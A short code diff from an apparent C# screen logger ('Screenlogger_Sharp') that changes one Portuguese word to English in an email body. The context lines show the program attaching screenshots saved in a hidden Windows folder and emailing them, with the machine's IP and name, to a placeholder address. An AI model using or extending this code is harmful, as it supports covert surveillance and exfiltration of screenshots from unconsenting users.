@@ -107,7 +107,7 @@ namespace Screenlogger_Sharp
                 email.From = new MailAddress("youremail@outlook.com");
                 email.Subject = "New Pic";
                 email.IsBodyHtml = true;
-                email.Body = data + " <br> " + hora + "<br>IP: " + ip + "<br>Máquina: " + NomePc;
+                email.Body = data + " <br> " + hora + "<br>IP: " + ip + "<br>Machine: " + NomePc;
 
                 System.Net.Mail.Attachment aa;
                 aa = new System.Net.Mail.Attachment(@"C:\Windows\ILC\" + a++ + ".jpeg");
